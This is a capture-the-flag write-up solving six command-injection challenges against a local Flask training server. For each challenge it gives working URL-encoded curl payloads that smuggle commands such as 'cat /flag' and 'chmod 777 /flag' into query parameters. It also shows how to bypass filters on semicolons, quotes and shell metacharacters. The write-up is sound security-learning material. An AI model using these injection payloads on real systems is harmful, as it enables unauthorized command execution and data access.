# CMDi

## CMDi 1

```shell
cat /challenge/server
```

The Flask app takes a directory as query param (`/adventure?dir`) and executes `ls -l {dir}`
Can inject `; cat <flag>`

Start the server and use curl:

```shell
curl http://challenge.localhost:80/adventure?dir=.%3B%20cat%20%2Fflag
```

(URL-encoding of ".; cat /flag")

## CMDi 2

```shell
cat /challenge/server
```

The Flask app takes a directory as query param (`/stage?output-path`) and executes `ls -l {output-path}`
Can't use previous solution as the server removes ";"

Executing this:

```shell
ls -l / | grep "flag" | awk '{print "/" $NF}' | xargs cat
```

Lists contents of `/`, takes the line with `flag`, prints only the last word "flag" along with a `/`, use this output as an argument of cat

Start the server and use curl:

```shell
curl http://challenge.localhost:80/stage?output-path=%2F%20%7C%20grep%20%22flag%22%20%7C%20awk%20%27%7Bprint%20%22%2F%22%20%24NF%7D%27%20%7C%20xargs%20cat
```

## CMDi 3

```shell
cat /challenge/server
```

The Flask app takes a directory as query param (`/trial?storage-path`) and executes `ls -l '{storage-path}'`
Injection has to take care of `'`

Executing: \
ls -l '**.'; cat /flag; echo 'yayy**'

Start the server and use curl:

```shell
curl http://challenge.localhost:80/trial?storage-path=.%27%3B%20cat%20%2Fflag%3B%20echo%20%27yayy
```

## CMDi 4

```shell
cat /challenge/server
```

The Flask app takes a timezone as query param (`/initiative?time-region`) and executes `TZ={time-region} date`

Executing: \
TZ=**Hogwarts;cat /flag;** date

Start the server and use curl:

```shell
curl http://challenge.localhost:80/initiative?time-region=Hogwarts%3Bcat%20%2Fflag%3B
```

## CMDi 5

```shell
cat /challenge/server
```

The Flask app takes a path as query param (`/assignment?path`) and executes `touch {path}`
Output is not shown, so `cat` won't work. But we can change the permission of the flag file and then read it.

Executing: \
touch **/flag; chmod 777 /flag**

Start the server and use curl:

```shell
curl http://challenge.localhost:80/assignment?path=%2Fflag%3B%20chmod%20777%20%2Fflag
cat /flag
```

## CMDi 6

```shell
cat /challenge/server
```

The Flask app takes a path as query param (`/exercise?subdirectory`) and executes `ls -l {subdirectory}` \
Problem: The special characters **; & | > < ( ) ` $** all are blocked \

We know that _newline_ can also be used as a command separator.

Executing:

```shell
ls -l .
cat /flag
```

Start the server and use curl:

```shell
curl http://challenge.localhost:80/exercise?subdirectory=.%0Acat%20/flag
```
